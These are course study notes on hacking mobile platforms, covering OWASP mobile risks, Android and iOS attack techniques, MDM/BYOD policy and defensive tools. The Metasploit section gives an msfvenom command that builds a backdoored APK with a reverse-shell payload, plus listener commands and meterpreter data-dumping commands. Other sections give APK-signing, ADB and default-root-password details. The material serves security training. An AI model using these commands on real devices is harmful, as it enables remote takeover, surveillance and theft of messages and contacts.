
---

# Module 17: Hacking Mobile Platforms

## Learning Objectives

- Understand mobile platform attack vectors
- Explain how to hack Android OS
- Explain how to hack iOS
- Understand the importance of Mobile Device Management (MDM)
- Adopt various mobile security countermeasures
- Use various mobile security tools

---

## Mobile Platform Attack Vectors

### Vulnerable Areas in Mobile Business Environment

- Smartphones are a treasure trove for attackers (corporate & personal data)
- Threats arise from: Internet connectivity (3G/4G/5G, Bluetooth, Wi-Fi), commercial apps, different communication methods
- Data transmission paths are vulnerable

### OWASP Top 10 Mobile Risks - 2024

| Risk | Description |
|------|-------------|
| **M1 - Improper Credential Usage** | Hardcoded credentials, stored in unprotected locations, transmitted without encryption, weak authentication |
| **M2 - Inadequate Supply Chain Security** | Flawed third-party libraries, insecure coding, inadequate testing, weak app signing/distribution |
| **M3 - Insecure Authentication/Authorization** | Weak password policies, insecure token handling, improper authorization checks |
| **M4 - Insufficient Input/Output Validation** | SQL injection, command injection, XSS due to lack of sanitization |
| **M5 - Insecure Communication** | Deprecated protocols, improper SSL config, invalid certificates → data interception |
| **M6 - Inadequate Privacy Controls** | Poor PII protection, non-compliance with privacy laws |
| **M7 - Insufficient Binary Protections** | Lack of protection against code tampering & reverse engineering |
| **M8 - Security Misconfiguration** | Debugging enabled, unnecessary permissions, default credentials |
| **M9 - Insecure Data Storage** | Plaintext storage, unsecured databases, weak encryption |
| **M10 - Insufficient Cryptography** | Weak/outdated encryption, poor key management, flawed implementation |

### Anatomy of a Mobile Attack

Attackers exploit vulnerabilities in **The Device**, **The Network**, and **The Data Center/Cloud**.

#### Device-based Attacks

| Category | Types |
|----------|-------|
| **Browser-based** | Phishing, Framing (iframe), Clickjacking (UI redress), Man-in-the-Mobile (OTP theft), Buffer Overflow, Data Caching |
| **Phone/SMS-based** | Baseband Attacks (GSM/3GPP processor), SMiShing (SMS phishing) |
| **Application-based** | Sensitive Data Storage, No/Weak Encryption, Improper SSL Validation, Configuration Manipulation, Dynamic Runtime Injection, Unintended Permissions, Escalated Privileges, UI overlay, Intent hijacking, GPS spoofing |
| **OS-based** | No/Weak Passcode, iOS Jailbreaking, Android Rooting, OS Data Caching, Carrier-loaded Software, User-initiated Code |

#### Network-based Attacks

- Wi-Fi (weak/no encryption)
- Rogue Access Points
- Packet Sniffing
- Man-in-the-Middle (MITM)
- Session Hijacking
- DNS Poisoning
- SSLStrip (downgrades HTTPS to HTTP)
- Fake SSL Certificates

#### Data Center/Cloud Attacks

- **Web-server attacks:** Platform vulnerabilities, misconfiguration, XSS, CSRF, weak input validation, brute-force
- **Database attacks:** SQL injection, privilege escalation, data dumping, OS command execution

### How Hackers Profit from Compromised Mobile Devices

| Category | Examples |
|----------|----------|
| **Surveillance** | Audio, camera, location, call logs |
| **Financial Theft** | Banking, TANs, premium SMS |
| **Botnet Activity** | DDoS, click fraud |
| **Impersonation** | SMS, email, social media posts |
| **Data Theft** | Contacts, passwords, IMEI, health info |
| **Other** | Ransomware, crypto mining |

### Mobile Attack Vectors

- Malware, virus, rootkit
- Data exfiltration, tampering, loss
- Application modification, vulnerabilities
- Jailbroken/rooted devices
- Unapproved physical access

### Mobile Platform Vulnerabilities & Risks

- Malicious apps in stores
- Weak data security & communication security
- Mobile malware, excessive permissions
- App sandboxing vulnerabilities
- Weak device/app encryption
- OS/app update issues
- Jailbreaking/rooting

### Security Issues from App Stores

- Attackers repackage legitimate apps with malware → upload to third-party stores
- Insufficient vetting allows malicious/fake apps
- Social engineering forces users to download outside official stores

### App Sandboxing Issues

- **Sandboxing:** Limits app resources to intended functionality
- **Secure sandbox:** App cannot access other users' data/system resources
- **Vulnerable sandbox:** Malicious app exploits vulnerabilities to breach perimeter → accesses other data/system resources

### Mobile Spam (SMS Spam / m-spam)

- Unsolicited bulk messages via SMS, MMS, IM, email
- Consequences: financial loss, malware injection, data breach

### SMS Phishing Attack (SMiShing)

- Attacker sends SMS with deceptive link/phone number
- Victim reveals personal/financial info (SSN, credit card, banking credentials)
- Used for identity theft, online purchases

**Why SMS Phishing is Effective:**
- High open rates, trust in SMS
- Limited space (harder to spot phishing)
- Lack of security awareness
- Mobile devices less protected
- Ease of impersonation (spoofed numbers)
- Urgency, direct links, shortened URLs
- Lack of anti-phishing features in SMS

### Pairing Mobile Devices on Open Bluetooth/Wi-Fi

| Attack | Description |
|--------|-------------|
| **Bluesnarfing** | Theft of contacts, emails, photos, videos via Bluetooth |
| **Bluebugging** | Remote access to device features; backdoor; intercept calls/messages |

### Agent Smith Attack

1. Victim installs malicious app from third-party store (games, photo editors)
2. Malicious code replaces legitimate apps (WhatsApp, SHAREit, MX Player) using C&C commands
3. Attacker produces massive fraudulent ads for financial gain
4. Also steals personal info, credentials, bank details

### Exploiting SS7 Vulnerability

- **SS7** allows roaming; operates on mutual trust **without authentication**
- Attacker performs **MITM** → intercepts texts/calls, bypasses 2FA
- **Risks:** Subscriber identity exposure, phone tapping, DoS, location tracking

### Simjacker: SIM Card Attack

- Vulnerability in SIM card's **S@T browser** (pre-installed)
- Attacker sends SMS with hidden code; S@T browser processes automatically
- **Malicious activities:** Capture location, monitor calls, make expensive calls, send premium messages, DoS, block SIM

### Call Spoofing

- Manipulate caller ID to display trusted source (bank, government)
- **Tools:** SpoofCard, Fake Call, SpoofTel, Fake Caller ID

### OTP Hijacking / Two-Factor Authentication Hijacking

- Attacker steals OTP via: social engineering (SIM transfer), SIM jacking, lock screen notifications
- Uses stolen OTP to login, reset passwords, steal info
- **Tools:** AdvPhishing, mprhish

### Camera/Microphone Capture Attacks

| Attack | Description |
|--------|-------------|
| **Camfecting** | Infect device with RAT → access camera/microphone remotely; disable camera light |
| **Android Camera Hijack** | Exploit bypass vulnerabilities to access camera/microphone even on locked device; requires permissions: CAMERA, RECORD_AUDIO, ACCESS_COARSE/FINE_LOCATION |

- **Tool:** StormBreaker

---

## Hacking Android OS

### Android OS

- Linux kernel-based, open-source platform
- **Features:** Prebuilt UI components, multiple storage options (Shared Preferences, Internal/External Storage, SQLite), RenderScript, ART (AOT/JIT), Blink/WebKit browser

### Android OS Architecture (6 sections, 5 layers)

1. **System Apps** (dialer, email, camera, SMS, browser)
2. **Java API Framework** (Content Providers, View System, Activity Manager, Location Manager, Package Manager, Notification Manager, Resource Manager, Telephony Manager, Window Manager)
3. **Native C/C++ Libraries** (WebKit/Blink, Libc, Media Framework, OpenGL ES, SQLite, FreeType, SSL)
4. **Android Runtime** (ART with AOT/JIT, Core Libraries)
5. **Hardware Abstraction Layer (HAL)**
6. **Linux Kernel** (drivers: audio, binder, display, Bluetooth, camera, Wi-Fi, power management)

### Android Device Administration API

**Policies supported:**
- Password enabled, minimum length, alphanumeric/complex required
- Minimum letters/lowercase/uppercase/non-letters/numbers/symbols
- Password expiration timeout, history restriction
- Maximum failed password attempts
- Maximum inactivity time lock
- Storage encryption required, camera disabled
- Remote wipe

### Android Rooting

- **Goal:** Overcome manufacturer/carrier restrictions → privileged control (root access)
- **Process:** Exploit firmware vulnerabilities → copy `su` binary to `/system/xbin/su` → grant executable permissions
- **Benefits:** Modify system files, remove bloatware, low-level hardware access, tethering, custom ROMs
- **Risks:** Voids warranty, poor performance, malware infection, bricking
- **Tools:** KingRoot (with/without PC), OneClickRoot, Magisk Manager, iRoot

### Identifying Attack Surfaces Using drozer

**Commands:**
```
dz> run app.package.list                           # List all packages
dz> run app.package.list -f <string>               # Filter packages
dz> run app.package.info -a <package_name>         # Package details
dz> run app.package.attacksurface <package_name>   # List exported activities/services/receivers/providers
dz> run app.activity.start --component <package_name> <activity_name>  # Launch activity
```

### Bypassing FRP on Android Phones Using 4ukey

- **FRP (Factory Reset Protection):** Prevents unauthorized access to lost/stolen devices
- **4ukey bypasses FRP** → gains access to contacts, messages, photos

### Hacking with zANTI

**Attacks possible:**
- MAC spoofing, malicious Wi-Fi hotspot, port scanning
- Router exploitation, password complexity audits
- MITM, DoS, HTTP request/response modification
- Session hijacking, image replacement, intercept downloads

### Hacking Networks Using Kali NetHunter

- HID keyboard attacks, BadUSB, evil AP MANA attacks
- Custom payload generation with Metasploit

### Launch DoS Attack using Low Orbit Ion Cannon (LOIC)

- UDP, HTTP, or TCP flood attacks
- Steps: Enter target IP → Select method → Set port/threads → START

### Exploiting Android Device through ADB Using PhoneSploit Pro

- Requires TCP debugging enabled on port 5555
- **Capabilities:** Screen capture, dump system info, view running apps, port forwarding, install/uninstall apps, Wi-Fi control

### Launching Man-in-the-Disk (MITD) Attack

- Exploits **external storage** (not sandboxed like internal storage)
- **Process:**
  1. Legitimate app stores update code on external storage
  2. Attacker monitors and injects malicious code
  3. App fetches tampered code → installs fraudulent app
  4. Attacker steals sensitive info or takes control

### Launching Spearphone Attack

- Exploits **accelerometer** (no permissions required)
- Records loudspeaker data (voice calls, voice assistants, audio files)
- Allows speech recognition, speaker identification, gender classification

### Exploiting Android Devices Using Metasploit

**Step 1 - Create payload:**
```bash
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<IP> R > Backdoor.apk
```

**Step 2 - Set listener:**
```bash
msf > use exploit/multi/handler
msf > set PAYLOAD android/meterpreter/reverse_tcp
msf > set LHOST <IP>
msf > exploit
```

**Meterpreter commands:** `sysinfo`, `ipconfig`, `pwd`, `ps`, `dump_sms`, `dump_contacts`, `webcam_list`

### Analyzing Android Devices (via ADB)

| Technique | Command |
|-----------|---------|
| Access shell over Wi-Fi | `adb tcpip 5555` → `adb connect <IP>` → `adb shell` |
| List installed apps (third-party) | `adb shell pm list packages -3 -f` |
| Disassemble APK | `apktool d <App>.apk` |
| Monitor logs | `adb logcat > logcat.log` |
| List open files | `lsof -p <pid>` |
| List open connections | `netstat -p | grep <pid>` |
| Sign malicious APK | `keytool -genkey...` → `apksigner sign --ks <keystore> <file>.apk` |

### Other Techniques for Hacking Android Devices

| Technique | Description |
|-----------|-------------|
| **Advanced SMS Phishing** | Exploits OTA provisioning; attacker needs victim's IMSI; sends malicious settings via SMS |
| **Bypass SSL Pinning** | Reverse engineering (Apktool) to modify `checkServerTrusted` or hooking (Frida) |
| **Tap'n Ghost Attack** | Exploits NFC and capacitive touchscreens; **TAP** (NFC triggers URL) + **Ghost Touch Generator** (forces cancel button to act as permit) |

### Android Malware

- **Mamont:** Banking Trojan masquerading as Chrome; requests call/SMS permissions; fake cash prize claim
- Others: SecuriDropper, Dwphon, DogeRAT, Tambir, SoumniBot

### Android Hacking Tools

- **AndroidRAT:** Remote control, persistent backdoor, location, SIM details, IP/MAC
- **Ghost Framework:** ADB-based post-exploitation; port forwarding, file extraction, screen recording, Wi-Fi management
- **PCAPdroid:** Network traffic capture without root

### Securing Android Devices

**Countermeasures:**
- Enable screen lock with strong password/biometrics
- **Never root** device
- Download only from official markets
- Update OS and antivirus regularly
- Enable encryption
- Use AppLock for sensitive apps
- Enable GPS for tracking (Find My Device)
- Turn off: Visible Passwords, Wi-Fi when not in use, USB debugging
- Use VPN, two-step verification, password manager
- Enable screen pinning, Google Play Protect

### Android Security Tools

- Kaspersky Antivirus for Android, Avira, Avast, McAfee, Lookout, Sophos

### Android Device Tracking Tools

- **Google Find My Device:** Locate, lock, erase remotely
- Find My Phone, Where's My Droid, Prey

### Android Vulnerability Scanners

- Quixxi App Shield, ImmuniWeb MobileSuite, Yaazhini, Vulners Scanner

### Static Analysis of Android APK Using MobSF

- **MobSF (Mobile Security Framework):** Static & dynamic analysis; extracts permissions, browsable activities, signer certificates
- **Sixo Online APK Analyzer:** Decompile binary XML files and resources

---

## Hacking iOS

### Apple iOS

- iOS architecture (5 layers): **Cocoa Application → Media → Core Services → Core OS → Kernel & Device Drivers**

### Jailbreaking iOS

- **Definition:** Install modified kernel patches to run unsigned third-party applications; provides root access; removes sandbox restrictions
- **Risks:** Voids warranty, poor performance, malware, bricking

#### Types of Jailbreaking

| Type | Access Level | Patchable by |
|------|--------------|---------------|
| **Userland Exploit** | User-level only | Firmware update |
| **iBoot Exploit** | User + iBoot-level | Firmware update |
| **Bootrom Exploit** | User + iBoot-level | Hardware update only |

#### Jailbreaking Techniques

| Technique | Description |
|-----------|-------------|
| **Untethered** | Remains jailbroken after reboot |
| **Semi-tethered** | Normal functions after reboot; need tool for jailbroken addons |
| **Tethered** | Gets stuck on reboot; must re-jailbreak with computer |
| **Semi-untethered** | Kernel not patched after reboot; repatch with on-device app |

#### Jailbreaking Tools

- Hexxa Plus (repo extractor), Redensa, checkra1n, palera1n, Sileo, Cydia

### Hacking using Spyzie

- Hack SMS, call logs, app chats, GPS remotely; **no jailbreaking required**

### iOS Trustjacking

- Exploits **iTunes Wi-Fi Sync** feature
- Victim connects phone to infected trusted computer → clicks "Trust"
- Attacker gains persistent access even after disconnection
- Can read messages, emails, passwords, banking credentials; backup/restore data; replace apps with malicious versions

### Post-exploitation on iOS Devices Using SeaShell Framework

- Exploits **CoreTrust vulnerability**; generates IPA files; initiates TCP listener
- Command example: `safari_history` (retrieves Safari browsing history)

### Analyzing and Manipulating iOS Applications

| Technique | Tool/Method |
|-----------|-------------|
| Runtime manipulation | **Cypri** (JS interpreter for Objective-C) |
| Method swizzling (monkey patching) | Modify existing methods at runtime; used for logging, JS injection, detection bypass |
| Keychain extraction | **Keychain Dumper** |
| Method hooking, SSL pinning bypass, jailbreak detection bypass | **objection** (with Frida) |

### Analyzing iOS Devices

| Technique | Method |
|-----------|--------|
| Access device shell | SSH over Wi-Fi (`root@<IP>`) or USB (usbmuxd); default password: `alpine` |
| List installed apps | `frida-ps -Uai` |
| Network sniffing | `rvictl -s <UDID>` → Wireshark on `rvi0` |
| Open connections | `lsof -i` |
| Process exploration | r2frida (`:dm`, `:il`, `:search`) |

### iOS Malware

- **GoldPickaxe:** Trojan; tricks victims via smishing; installs fake MDM profile; steals face scans, ID documents, bank accounts
- Others: SpectralBlur, LightSpy, KingsPawn, Pegasus

### iOS Hacking Tools

- **Elcomsoft Phone Breaker:** iCloud backups, keychain decryption, GPU acceleration
- Enzyme, Network Analyzer, iOS Binary Security Analyzer, iWepPRO, Frida

### Securing iOS Devices

**Countermeasures:**
- Enable Passcode Lock, Auto-Lock timeout
- Download only from Apple App Store
- **Do not jailbreak** (especially in enterprise)
- Configure Find My iPhone
- Disable iCloud for sensitive enterprise data
- Enable "Ask to Join Networks"
- Update OS regularly; enable Erase Data after 10 attempts
- Disable Voice Dial, Geotagging, Siri, autofill
- Use VPN, two-factor authentication
- Disable lock-screen notifications for sensitive apps

### iOS Device Security Tools

- Malwarebytes Mobile Security, Norton, McAfee, Trend Micro, AVG, Kaspersky

### iOS Device Tracking Tools

- **Find My:** Locate, lock, play sound, display message, erase data; Lost Mode tracks location history
- Glympe En Route, Prey, Mobile Phone Tracker Pro, FollowMee

---

## Mobile Device Management (MDM)

### MDM Features

- Over-the-air distribution of apps, data, configuration
- Remote lock and wipe
- Root/jailbreak detection
- Policy enforcement, inventory tracking
- Real-time monitoring

### MDM Solutions

- Scalefusion MDM, ManageEngine Mobile Device Manager Plus
- Microsoft Intune, SOTI MobiControl, AppTec360, Jamf Pro

### Bring Your Own Device (BYOD)

**Definition:** Policy allowing employees to bring personal devices to workplace and access organizational resources.

#### BYOD Benefits
- Increased productivity, employee satisfaction, work flexibility, lower costs

#### BYOD Risks

| Risk | Description |
|------|-------------|
| Unsecured networks | Data leakage over public Wi-Fi |
| Data leakage | Lost/stolen device exposes corporate data |
| Improper disposal | Sensitive data on disposed devices |
| Device diversity | Difficult to manage multiple platforms |
| Mixed personal/private data | Security & privacy implications |
| Lost/stolen devices | Corporate data compromise |
| Jailbreaking/Rooting | Bypasses security measures |
| Inadequate backup | Data loss risk |
| Outdated software | Unpatched vulnerabilities |
| Shadow IT | Unauthorized cloud services |

#### BYOD Policy Implementation (5 Principles)

1. **Define requirements:** Segment users, perform Privacy Impact Assessment (PIA)
2. **Select devices & build technology portfolio:** Use MDM, virtual desktops
3. **Develop policies:** Include HR, legal, security; define acceptable use, data ownership
4. **Security:** Asset/identity management, storage controls, network access, DLP
5. **Support:** Establish processes for increased support calls

#### BYOD Security Guidelines

**For Administrator:**
- Secure data centers with multi-layered protection
- Educate employees; use encrypted channels
- Do not allow jailbroken/rooted devices
- Apply session authentication & timeout
- Use MFA, SSL VPN; remote wipe capability
- Real-time monitoring (EMM)
- Containerization/sandboxing

**For Employee:**
- Use encryption; separate business & personal data
- Register device for remote locate/wipe
- Regularly update OS & patches
- Use antivirus & DLP; set strong passcode
- Report lost/stolen device
- Use VPN on public Wi-Fi; do not jailbreak/root

---

## Mobile Security Guidelines and Tools

### OWASP Top 10 Mobile Risks - Solutions Summary

| Risk | Key Solutions |
|------|---------------|
| Improper Credential Usage | Avoid hardcoded credentials; encrypt transmission; use revocable access tokens |
| Inadequate Supply Chain Security | Secure app signing; use trusted third-party libraries; security testing |
| Insecure Authentication/Authorization | Avoid weak patterns; reinforce server-side auth; use biometrics |
| Insufficient Input/Output Validation | Strict validation; data integrity checks; secure coding |
| Insecure Communication | Use trusted CA certificates; certificate pinning; SSL chain verification |
| Inadequate Privacy Controls | Proper authentication/authorization; static/dynamic security checking |
| Insufficient Binary Protections | Code obfuscation; anti-tampering; integrity checks |
| Security Misconfiguration | No default credentials; disable debugging; limit exported activities |
| Insecure Data Storage | Robust encryption; secure storage locations; regular patching |
| Insufficient Cryptography | Strong algorithms (SHA-256, bcrypt); secure key management; salting; PBKDF2 |

### General Guidelines for Mobile Platform Security

- Install from trusted stores; securely wipe before disposal
- Disable Wi-Fi/Bluetooth when not in use
- Use strong passcode with idle timeout and wipe after failed attempts
- Update OS and apps regularly
- Enable remote management (MDM)
- Do not allow rooting/jailbreaking
- Use remote wipe services
- Encrypt storage; perform periodic encrypted backups
- Allow only signed applications
- Use secure network protocols (TLS); avoid public Wi-Fi without VPN

### Mobile Device Security Guidelines for Administrator

- Publish enterprise BYOD and cloud policies
- Specify session timeout and allowed authentication methods
- Develop system threat models
- Use UEM, MTD, biometrics, CASB
- Implement DLP policies; secure data erasure before decommissioning

### SMS Phishing Countermeasures

- Never reply to suspicious SMS or click links
- Do not provide personal/financial information
- Enable "block texts from internet"
- Check for spelling/grammar errors
- Install anti-phishing software and anti-malware
- Implement MFA; run phishing simulations

### OTP Hijacking Countermeasures

**For users:** Strong unique passwords, update software, SIM locking, disable lock screen notifications, avoid SMS-based authentication

**For developers:** Transmit OTPs over secure channels (encrypted SMS, push notifications), end-to-end encryption, combine with biometrics, limit requests, short expiration, use HOTP/TOTP

### Critical Data Storage: Android KeyStore and iOS Keychain Recommendations

**Android KeyStore:**
- Use authentication (PIN, password, fingerprint)
- Use hardware-backed KeyStore
- No hardcoded sensitive data; obfuscate code

**iOS Keychain:**
- Use Touch ID, Face ID, passcodes
- Use hardware-backed 256-bit AES encryption
- Use ACLs; erase keychain data on app uninstallation

### Reverse Engineering Mobile Applications

**Used for:** Reading source code, detecting vulnerabilities, finding hardcoded secrets, malware analysis, compliance verification

**Why effective:**
- Initiates security analysis (vulnerability discovery, malware analysis)
- Initiates black-box testing (neutralize root detection, SSL pinning)
- Improves static analysis
- Performs resilience assessment (MASVS-R controls)

### Mobile Security Tools

| Category | Tools |
|----------|-------|
| **Source Code Analysis** | Syhunt Mobile, Android lint, Zimperium z3A, Appium, Infer |
| **Reverse Engineering** | Apktool, Frida, JEB, Bytecode Viewer |
| **App Repackaging Detectors** | Appdome (RASP, checksum validation), freeRASP, iXGuard |
| **Mobile Protection** | Avast, Comodo Mobile Security, AVG, Norton, Bitdefender, ESET |
| **Anti-Spyware** | TotalAV, Certo, Anti Spy Detector, iAmNotified |
| **Pen Testing Toolkits** | ImmuniWeb MobileSuite, MobSF, Codified Security, Appknox |

---

## Module Summary

This module covered:
- Mobile platform attack vectors (device, network, data center/cloud)
- OWASP Top 10 mobile risks (2024)
- Android hacking: rooting, drozer, FRP bypass, zANTI, NetHunter, LOIC, MITD, Spearphone, Metasploit, analysis techniques
- Android malware (Mamont) and hacking tools (AndroidRAT, Ghost Framework)
- Securing Android devices (countermeasures, security tools, tracking tools, vulnerability scanners)
- iOS hacking: jailbreaking (types, techniques, tools), Trustjacking, SeaShell, Cypri, Keychain Dumper, objection
- iOS malware (GoldPickaxe) and hacking tools (Elcomsoft Phone Breaker)
- Securing iOS devices (countermeasures, security tools, tracking tools)
- MDM and BYOD (benefits, risks, policy implementation, security guidelines)
- Mobile security tools (source code analysis, reverse engineering, repackaging detectors, protection tools, anti-spyware, pen testing)

**Next Module:** IoT and OT Hacking

---

## Key Takeaways (Short)

1. **OWASP Top 10 Mobile Risks** focus on credentials, supply chain, authentication, validation, communication, privacy, binary protection, misconfiguration, data storage, and cryptography.

2. **Attack vectors** split into Device (browser, SMS, app, OS), Network (Wi-Fi, MITM, sniffing), and Data Center (web server, database).

3. **Android rooting** gives root access but voids warranty and increases malware risk. Tools: KingRoot, OneClickRoot.

4. **drozer** identifies Android attack surfaces via package enumeration and activity launching.

5. **MITD attack** abuses external storage; **Spearphone** uses accelerometer to eavesdrop.

6. **iOS jailbreaking** types: Userland, iBoot, Bootrom. Techniques: Untethered, Semi-tethered, Tethered, Semi-untethered.

7. **iOS Trustjacking** exploits iTunes Wi-Fi Sync after user clicks "Trust".

8. **objection** & **Frida** bypass SSL pinning and jailbreak detection via method hooking.

9. **MDM** features: remote lock/wipe, root/jailbreak detection, policy enforcement.

10. **BYOD** benefits: productivity, cost savings. **Risks:** data leakage, device diversity, lost devices. **Mitigations:** containerization, encryption, remote wipe.

---

## Important Terms Summary

| Term | Definition |
|------|------------|
| **SMiShing** | SMS phishing |
| **Bluesnarfing** | Theft of info via Bluetooth |
| **Bluebugging** | Remote control via Bluetooth |
| **SS7** | Roaming protocol with mutual trust, no auth → MITM |
| **S@T browser** | SIM card vulnerability exploited by Simjacker |
| **FRP** | Factory Reset Protection (Android anti-theft) |
| **MITD** | Man-in-the-Disk (external storage attack) |
| **CoreTrust** | iOS vulnerability allowing unauthorized software |
| **Method Swizzling** | Runtime method replacement (monkey patching) |
| **Keychain** | iOS encrypted storage for secrets |
| **PIA** | Privacy Impact Assessment (for BYOD) |
| **RASP** | Runtime Application Self-Protection |
| **MASVS-R** | Mobile App Security Verification Standard - Anti-Reversing |

**End of Notes**
